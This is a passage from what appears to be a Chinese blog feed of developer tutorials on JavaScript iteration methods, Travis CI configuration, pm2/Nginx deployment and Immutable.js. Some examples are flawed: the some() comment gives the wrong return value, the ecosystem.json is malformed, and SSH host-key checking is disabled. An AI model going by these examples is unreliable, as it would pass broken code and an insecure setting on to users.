class="attr">name</span>: <span class="string">'Pear'</span> &#125;</span><br><span class="line">])</span><br><span class="line"><span class="comment">// &lt;- 'George, Sam, Pear'</span></span><br></pre></td></tr></table></figure><h3 id="2-15-some"><a href="#2-15-some" class="headerlink" title="2.15 some"></a>2.15 some</h3><blockquote><p>返回一个<code>boolean</code>，判断是否有元素符合<code>func</code>条件，如果有一个元素符合<code>func</code>条件，则循环会终止</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">list.some(<span class="function">(<span class="params">d, i</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(d, i);</span><br><span class="line">    <span class="keyword">return</span> d &gt; <span class="number">3</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// print: 1,0 2,1 3,2 4,3</span></span><br><span class="line"><span class="comment">// return false</span></span><br></pre></td></tr></table></figure><h3 id="2-16-every"><a href="#2-16-every" class="headerlink" title="2.16 every"></a>2.16 every</h3><blockquote><p>返回一个<code>boolean</code>，判断每个元素是否符合<code>func</code>条件，有一个元素不满足<code>func</code>条件，则循环终止，返回<code>false</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">list.every(<span class="function">(<span class="params">d, i</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(d, i);</span><br><span class="line">    <span class="keyword">return</span> d &lt; <span class="number">3</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// print: 1,0 2,1 3,2</span></span><br><span class="line"><span class="comment">// return false</span></span><br></pre></td></tr></table></figure><h2 id="三、Object"><a href="#三、Object" class="headerlink" title="三、Object"></a>三、Object</h2><h3 id="3-1-for-in"><a href="#3-1-for-in" class="headerlink" title="3.1 for in"></a>3.1 for in</h3><blockquote><p><code>for-in</code>循环实际是为循环”enumerable“对象而设计的，<code>for in</code>也可以循环数组，但是不推荐这样使用，<code>for–in</code>是用来循环带有字符串<code>key</code>的对象的方法</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:<span class="number">1</span>, <span class="attr">b</span>:<span class="number">2</span>, <span class="attr">c</span>:<span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"obj."</span> + prop + <span class="string">" = "</span> + obj[prop]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print:  "obj.a = 1" "obj.b = 2" "obj.c = 3"</span></span><br></pre></td></tr></table></figure><h3 id="3-2-for-of"><a href="#3-2-for-of" class="headerlink" title="3.2 for of"></a>3.2 for of</h3><blockquote><p><code>for of</code>为<code>ES6</code>提供，具有<code>iterator</code>接口，就可以用<code>for of</code>循环遍历它的成员</p></blockquote><ul><li><code>for of</code>循环可以使用的范围包括数组、<code>Set</code>和<code>Map</code>结构、某些类似数组的对象（比如<code>arguments</code>对象、<code>DOM NodeList</code>对象）、后文的<code>Generator</code>对象，以及字符串</li></ul><h4 id="3-2-1-entries"><a href="#3-2-1-entries" class="headerlink" title="3.2.1 entries"></a>3.2.1 entries</h4><blockquote><p><code>entries()</code> 返回一个遍历器对象，用来遍历[键名, 键值]组成的数组。对于数组，键名就是索引值；对于<code>Set</code>，键名与键值相同。<code>Map</code>结构的<code>iterator</code>接口，默认就是调用<code>entries</code>方法</p></blockquote><h4 id="3-2-2-keys"><a href="#3-2-2-keys" class="headerlink" title="3.2.2 keys"></a>3.2.2 keys</h4><ul><li><code>keys()</code> 返回一个遍历器对象，用来遍历所有的键名。</li></ul><h4 id="3-2-3-values"><a href="#3-2-3-values" class="headerlink" title="3.2.3 values"></a>3.2.3 values</h4><ul><li><code>values()</code>返回一个遍历器对象，用来遍历所有的键值。 </li></ul><blockquote><p>这三个方法调用后生成的遍历器对象，所遍历的都是计算生成的数据结构</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 遍历数组</span></span><br><span class="line"><span class="keyword">let</span> list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> e <span class="keyword">of</span> list) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print: 1 2 3 4 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历对象</span></span><br><span class="line">obj = &#123;<span class="attr">a</span>:<span class="number">1</span>, <span class="attr">b</span>:<span class="number">2</span>, <span class="attr">c</span>:<span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(obj)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key, obj[key]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print:  a 1 b 2 c 3</span></span><br><span class="line"><span class="comment">//说明：对于普通的对象，for...in循环可以遍历键名，for...of循环会报错。</span></span><br><span class="line"><span class="comment">//一种解决方法是，使用Object.keys方法将对象的键名生成一个数组，然后遍历这个数组。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// entries</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> pair <span class="keyword">of</span> arr.entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(pair);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [0, 'a']</span></span><br><span class="line"><span class="comment">// [1, 'b']</span></span><br><span class="line"><span class="comment">// [2, 'c']</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、String对象&quot;&gt;&lt;a href=&quot;#一、String对象&quot; class=&quot;headerlink&quot; title=&quot;一、String对象&quot;&gt;&lt;/a&gt;一、String对象&lt;/h2&gt;&lt;h3 id=&quot;1-1-slice&quot;&gt;&lt;a href=&quot;#1-1-slice&quot; c
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://blog.poetries.top/tags/JavaScript/"/>
    
      <category term="API" scheme="http://blog.poetries.top/tags/API/"/>
    
  </entry>
  
  <entry>
    <title>持续集成 Travis CI</title>
    <link href="http://blog.poetries.top/2018/02/23/travis-ci/"/>
    <id>http://blog.poetries.top/2018/02/23/travis-ci/</id>
    <published>2018-02-23T04:12:08.000Z</published>
    <updated>2018-04-10T03:33:13.995Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>来源于互联网</p></blockquote><h4 id="一、什么是持续集成？"><a href="#一、什么是持续集成？" class="headerlink" title="一、什么是持续集成？"></a>一、什么是持续集成？</h4><ul><li><code>Travis CI</code> 提供的是持续集成服务（<code>Continuous Integration</code>，简称 <code>CI</code>）。它绑定 <code>Github</code> 上面的项目，只要有新的代码，就会自动抓取。然后，提供一个运行环境，执行测试，完成构建，还能部署到服务器。</li><li>持续集成指的是只要代码有变更，就自动运行构建和测试，反馈运行结果。确保符合预期以后，再将新代码”集成”到主干。</li><li>持续集成的好处在于，每次代码的小幅变更，就能看到运行结果，从而不断累积小的变更，而不是在开发周期结束时，一下子合并一大块代码</li></ul><h4 id="二、-travis-yml"><a href="#二、-travis-yml" class="headerlink" title="二、.travis.yml"></a>二、.travis.yml</h4><blockquote><p>Travis 要求项目的根目录下面，必须有一个<code>.travis.yml</code>文件。这是配置文件，指定了 <code>Travis</code> 的行为。该文件必须保存在 <code>Github</code> 仓库里面，一旦代码仓库有新的 <code>Commit</code>，<code>Travis</code>就会去找这个文件，执行里面的命令</p></blockquote><ul><li>这个文件采用 <code>YAML</code> 格式。下面是一个最简单的 <code>Python</code> 项目的<code>.travis.yml</code>文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">language: python</span><br><span class="line">script: <span class="literal">true</span></span><br></pre></td></tr></table></figure><ul><li><code>language</code>字段指定了默认运行环境，这里设定使用 <code>Python</code> 环境</li><li><code>script</code>字段指定要运行的脚本，<code>script: true</code>表示不执行任何脚本，状态直接设为成功</li></ul><p><strong>面是一个稍微复杂一点的.travis.yml</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">language: python</span><br><span class="line">sudo: required</span><br><span class="line">before_install: sudo pip install foo</span><br><span class="line">script: py.test</span><br></pre></td></tr></table></figure><h4 id="三、运行流程"><a href="#三、运行流程" class="headerlink" title="三、运行流程"></a>三、运行流程</h4><ul><li><code>Travis</code> 的运行流程很简单，任何项目都会经过两个阶段<ul><li><code>install</code>  阶段：安装依赖</li><li><code>script</code> 阶段：运行脚本</li></ul></li></ul><h5 id="3-1-install-阶段"><a href="#3-1-install-阶段" class="headerlink" title="3.1 install 阶段"></a>3.1 install 阶段</h5><blockquote><p><code>install</code>字段用来指定安装脚本</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">install: ./install-dependencies.sh</span><br></pre></td></tr></table></figure><ul><li>如果有多个脚本，可以写成下面的形式</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">install:</span><br><span class="line"> - command1</span><br><span class="line"> - command2</span><br></pre></td></tr></table></figure><ul><li>上面代码中，如果<code>command1</code>失败了，整个构建就会停下来，不再往下进行。</li><li>如果不需要安装，即跳过安装阶段，就直接设为<code>true</code>。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">install: true</span><br></pre></td></tr></table></figure><h5 id="3-2、script-字段"><a href="#3-2、script-字段" class="headerlink" title="3.2、script 字段"></a>3.2、script 字段</h5><ul><li><code>script</code>字段用来指定构建或测试脚本</li></ul><p><code>script: bundle exec thor build</code></p><ul><li>如果有多个脚本，可以写成下面的形式</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">script:</span><br><span class="line"> - command1</span><br><span class="line"> - command2</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>，<code>script</code>与<code>install</code>不一样，如果<code>command1</code>失败，<code>command2</code>会继续执行。但是，整个构建阶段的状态是失败。如果<code>command2</code>只有在<code>command1</code>成功后才能执行，就要写成下面这样。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script: command1 &amp;&amp; command2</span><br></pre></td></tr></table></figure><h5 id="3-3-实例：Node-项目"><a href="#3-3-实例：Node-项目" class="headerlink" title="3.3 实例：Node 项目"></a>3.3 实例：Node 项目</h5><ul><li><code>Node</code> 项目的环境需要写成下面这样</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">language: node_js</span><br><span class="line">node_js:</span><br><span class="line">  - <span class="string">"8"</span></span><br></pre></td></tr></table></figure><ul><li>上面代码中，<code>node_js</code>字段用来指定 <code>Node</code> 版本。</li><li><code>Node</code> 项目的<code>install</code>和<code>script</code>阶段都有默认脚本，可以省略<ul><li><code>install</code>默认值：<code>npm install</code></li><li><code>script</code>默认值：<code>npm test</code></li></ul></li></ul><h5 id="3-4-部署"><a href="#3-4-部署" class="headerlink" title="3.4 部署"></a>3.4 部署</h5><ul><li><code>script</code>阶段结束以后，还可以设置<a href="https://docs.travis-ci.com/user/notifications/" target="_blank" rel="noopener">通知步骤（notification）</a>和<a href="https://docs.travis-ci.com/user/deployment/" target="_blank" rel="noopener">部署步骤</a>（deployment），它们不是必须的</li></ul><blockquote><p>部署的脚本可以在<code>script</code>阶段执行，也可以使用 <code>Travis</code> 为几十种常见服务提供的快捷部署功能。比如，要部署到 <code>Github Pages</code>，可以写成下面这样</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  provider: pages</span><br><span class="line">  skip_cleanup: <span class="literal">true</span></span><br><span class="line">  github_token: <span class="variable">$GITHUB_TOKEN</span> <span class="comment"># Set in travis-ci.org dashboard</span></span><br><span class="line">  on:</span><br><span class="line">    branch: master</span><br></pre></td></tr></table></figure><ul><li><a href="https://docs.travis-ci.com/user/deployment/" target="_blank" rel="noopener">其他部署方式</a></li></ul><h5 id="3-5-钩子方法"><a href="#3-5-钩子方法" class="headerlink" title="3.5 钩子方法"></a>3.5 钩子方法</h5><blockquote><p><code>Travis</code> 为上面这些阶段提供了7个钩子</p></blockquote><ul><li><code>before_install</code>：install 阶段之前执行</li><li><code>before_script</code>：script 阶段之前执行</li><li><code>after_failure</code>：script 阶段失败时执行</li><li><code>after_success</code>：script 阶段成功时执行</li><li><code>before_deploy</code>：deploy 步骤之前执行</li><li><code>after_deploy</code>：deploy 步骤之后执行</li><li><code>after_script</code>：script 阶段之后执行</li></ul><blockquote><p>完整的生命周期，从开始到结束是下面的流程</p></blockquote><ul><li><code>before_install</code></li><li><code>install</code></li><li><code>before_script</code></li><li><code>script</code></li><li><code>aftersuccess or afterfailure</code></li><li><code>[OPTIONAL] before_deploy</code></li><li><code>[OPTIONAL] deploy</code></li><li><code>[OPTIONAL] after_deploy</code></li><li><p><code>after_script</code></p></li><li><p>下面是一个before_install钩子的例子</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">before_install:</span><br><span class="line">  - sudo apt-get -qq update</span><br><span class="line">  - sudo apt-get install -y libxml2-dev</span><br></pre></td></tr></table></figure><blockquote><p>上面代码表示<code>before_install</code>阶段要做两件事，第一件事是要更新依赖，第二件事是安装<code>libxml2-dev</code>。用到的几个参数的含义如下：-qq表示减少中间步骤的输出，-y表示如果需要用户输入，总是输入yes</p></blockquote><h5 id="3-6-运行状态"><a href="#3-6-运行状态" class="headerlink" title="3.6 运行状态"></a>3.6 运行状态</h5><ul><li>最后，<code>Travis</code> 每次运行，可能会返回四种状态<ul><li><code>passed</code>：运行成功，所有步骤的退出码都是0</li><li><code>canceled</code>：用户取消执行</li><li><code>errored</code>：<code>before_install</code>、<code>install</code>、<code>before_script</code>有非零退出码，运行会立即停止</li><li><code>failed</code> ：<code>script</code>有非零状态码 ，会继续运行</li></ul></li></ul><h4 id="四、使用技巧"><a href="#四、使用技巧" class="headerlink" title="四、使用技巧"></a>四、使用技巧</h4><h5 id="4-1-环境变量"><a href="#4-1-环境变量" class="headerlink" title="4.1 环境变量"></a>4.1 环境变量</h5><ul><li><code>.travis.yml</code>的env字段可以定义环境变量,然后，脚本内部就使用这些变量了</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">env:</span><br><span class="line">  - DB=postgres</span><br><span class="line">  - SH=bash</span><br><span class="line">  - PACKAGE_VERSION=<span class="string">"1.0.*"</span></span><br></pre></td></tr></table></figure><blockquote><p>有些环境变量（比如用户名和密码）不能公开，这时可以通过 Travis 网站，写在每个仓库的设置页里面，Travis 会自动把它们加入环境变量。这样一来，脚本内部依然可以使用这些环境变量，但是只有管理员才能看到变量的值,<a href="https://docs.travis-ci.com/user/environment-variables" target="_blank" rel="noopener">具体操作文档</a></p></blockquote><p><img src="http://www.ruanyifeng.com/blogimg/asset/2017/bg2017121903.png" alt=""></p><h5 id="4-2-加密信息"><a href="#4-2-加密信息" class="headerlink" title="4.2 加密信息"></a>4.2 加密信息</h5><ul><li>如果不放心保密信息明文存在 <code>Travis</code> 的网站，可以使用 <code>Travis</code> 提供的加密功能</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;来源于互联网&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;一、什么是持续集成？&quot;&gt;&lt;a href=&quot;#一、什么是持续集成？&quot; class=&quot;headerlink&quot; title=&quot;一、什么是持续集成？&quot;&gt;&lt;/a&gt;一、什么是持续集成？&lt;/h4&gt;
      
    
    </summary>
    
      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="部署" scheme="http://blog.poetries.top/tags/%E9%83%A8%E7%BD%B2/"/>
    
      <category term="Travis CI" scheme="http://blog.poetries.top/tags/Travis-CI/"/>
    
  </entry>
  
  <entry>
    <title>pm2用法之ecosystem部署nodejs项目</title>
    <link href="http://blog.poetries.top/2018/02/22/pm2-ecosystem-deploy/"/>
    <id>http://blog.poetries.top/2018/02/22/pm2-ecosystem-deploy/</id>
    <published>2018-02-22T09:12:08.000Z</published>
    <updated>2018-04-10T03:33:13.991Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、node项目部署流程"><a href="#一、node项目部署流程" class="headerlink" title="一、node项目部署流程"></a>一、node项目部署流程</h2><p><img src="http://7xq6al.com1.z0.glb.clouddn.com/bushu-1.png" alt=""><br><img src="http://7xq6al.com1.z0.glb.clouddn.com/bushu-2.png" alt=""><br><img src="http://7xq6al.com1.z0.glb.clouddn.com/bushu-3.png" alt=""></p><h2 id="二、配置部署脚本文件"><a href="#二、配置部署脚本文件" class="headerlink" title="二、配置部署脚本文件"></a>二、配置部署脚本文件</h2><blockquote><p>在项目根目录添加<code>pm2</code>的部署脚本文件 <code>ecosystem.json</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"apps"</span>: [</span><br><span class="line">        <span class="string">"name"</span>: <span class="string">"movie"</span>, <span class="comment">//对应Nginx上的配置</span></span><br><span class="line">        <span class="string">"script"</span>: <span class="string">"app.js"</span>, <span class="comment">//入口文件</span></span><br><span class="line">        <span class="string">"env"</span>: &#123;</span><br><span class="line">            <span class="string">"COMON_VARIABLE"</span>: <span class="string">"true"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"env_production"</span>: &#123;</span><br><span class="line">            <span class="string">"NODE_ENV"</span>: <span class="string">"production"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"deploy"</span>: &#123;</span><br><span class="line">        <span class="string">"production"</span>: &#123;</span><br><span class="line">            <span class="string">"user"</span>: <span class="string">"poetries"</span>, <span class="comment">//Nginx服务器上的username</span></span><br><span class="line">            <span class="string">"host"</span>: [<span class="string">"120.120.14.21"</span>], <span class="comment">// 服务器地址</span></span><br><span class="line">            <span class="string">"port"</span>: <span class="string">"3922"</span>,</span><br><span class="line">            <span class="string">"ref"</span>: <span class="string">"origin/master"</span>, <span class="comment">//从指定的分支拉取代码</span></span><br><span class="line">            <span class="string">"repo"</span>: <span class="string">"git@github.com:poetries/poetries.github.io.git"</span>,</span><br><span class="line">            <span class="string">"path"</span>: <span class="string">"/www/movie/production"</span>,<span class="comment">//发布到服务器指定的目录下</span></span><br><span class="line">            <span class="string">"ssh_options"</span>: <span class="string">"StrictHostKeyChecking=no"</span>,</span><br><span class="line">            <span class="comment">//构建在发布</span></span><br><span class="line">            <span class="string">"post-deploy"</span>: <span class="string">"npm install --registry=https://registry.npm.taobao.org &amp;&amp; grunt build &amp;&amp; pm2 startOrRestart ecosystem.json --env production"</span>,</span><br><span class="line">            <span class="string">"env"</span>: &#123;</span><br><span class="line">                <span class="string">"NODE_ENV"</span>: <span class="string">"production"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、配置Nginx的server"><a href="#三、配置Nginx的server" class="headerlink" title="三、配置Nginx的server"></a>三、配置Nginx的server</h2><blockquote><p>在<code>nginx</code>安装目录下的<code>vhost</code>中新建一个<code>xx-3000.conf</code>的配置文件</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">upstream movie &#123; <span class="comment">// website项目的目录名称</span></span><br><span class="line">    server <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3000</span>; <span class="comment">// 服务器上的本地启动入口</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置server</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">    server_name movie.poetries.top; <span class="comment">//指向的域名</span></span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forward-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header Host $http_host;</span><br><span class="line">        proxy_set_header X-Nginx-<span class="built_in">Proxy</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">        proxy_pass http:<span class="comment">//movie; // 对应上面的目录</span></span><br><span class="line">        proxy_redirect off;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 处理静态资源</span></span><br><span class="line">    location ~* ^.+\.(jpg|jpeg|gif|png|ico|css|js|pdf|txt) &#123;</span><br><span class="line">        root /www/movie/public; <span class="comment">//静态资源路径</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、开启防火墙"><a href="#四、开启防火墙" class="headerlink" title="四、开启防火墙"></a>四、开启防火墙</h2><blockquote><p>Ubuntu的设置</p></blockquote><ul><li>打开 <code>sudo vi /etc/iptables.up.rules</code></li><li>生效 <code>sudo iptables-restore &lt; /etc/iptables.up.rules</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># movie</span></span><br><span class="line">-A INPUT -s 127.0.0.1 -p tcp --destination-port 3001 -m state ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line">-A OUTPUT -s 127.0.0.1 -p tcp --destination-port 3001 -m state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure><h2 id="五、部署命令"><a href="#五、部署命令" class="headerlink" title="五、部署命令"></a>五、部署命令</h2><ul><li><code>pm2 deploy ecosystem.json production setup</code> 初始化</li><li><code>pm2 deploy ecosystem.json production</code> 部署</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、node项目部署流程&quot;&gt;&lt;a href=&quot;#一、node项目部署流程&quot; class=&quot;headerlink&quot; title=&quot;一、node项目部署流程&quot;&gt;&lt;/a&gt;一、node项目部署流程&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://7xq6al.com1.z
      
    
    </summary>
    
      <category term="Back-end" scheme="http://blog.poetries.top/categories/Back-end/"/>
    
    
      <category term="Node" scheme="http://blog.poetries.top/tags/Node/"/>
    
      <category term="部署" scheme="http://blog.poetries.top/tags/%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>梳理Immutable常用API</title>
    <link href="http://blog.poetries.top/2018/02/04/immutable-api/"/>
    <id>http://blog.poetries.top/2018/02/04/immutable-api/</id>
    <published>2018-02-04T08:10:24.000Z</published>
    <updated>2018-04-10T03:33:13.987Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、fromJS"><a href="#一、fromJS" class="headerlink" title="一、fromJS"></a>一、fromJS</h2><ul><li>作用：是最最常用的将原生JS数据转换为<code>ImmutableJS</code>数据的转换方法,默认将原生<code>JS</code>的<code>Array</code>转为<code>List</code>，<code>Object</code>转为<code>Map</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS(&#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    b: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    c: <span class="number">40</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 得到</span></span><br><span class="line"><span class="built_in">Map</span> &#123;</span><br><span class="line">  <span class="string">"a"</span>: <span class="built_in">Map</span> &#123;</span><br><span class="line">    <span class="string">"b"</span>: List [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">"c"</span>: <span class="number">40</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常见</span></span><br><span class="line"><span class="keyword">const</span> t1 = Immutable.fromJS(&#123;<span class="attr">a</span>: &#123;<span class="attr">b</span>: [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]&#125;, <span class="attr">c</span>: <span class="number">40</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(t1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不常用</span></span><br><span class="line"><span class="keyword">const</span> t2 = Immutable.fromJS(&#123;<span class="attr">a</span>: &#123;<span class="attr">b</span>: [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>]&#125;, <span class="attr">c</span>: <span class="number">40</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 定制转换方式，下这种就是将Array转换为List，Object转换为Map</span></span><br><span class="line">    <span class="keyword">const</span> isIndexed = Immutable.Iterable.isIndexed(value);</span><br><span class="line">    <span class="keyword">return</span> isIndexed ? value.toList() : value.toOrderedMap();</span><br><span class="line">    <span class="comment">// true, "b", &#123;b: [10, 20, 30]&#125;</span></span><br><span class="line">    <span class="comment">// false, "a", &#123;a: &#123;b: [10, 20, 30]&#125;, c: 40&#125;</span></span><br><span class="line">    <span class="comment">// false, "", &#123;"": &#123;a: &#123;b: [10, 20, 30]&#125;, c: 40&#125;&#125;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(t2);</span><br></pre></td></tr></table></figure><h2 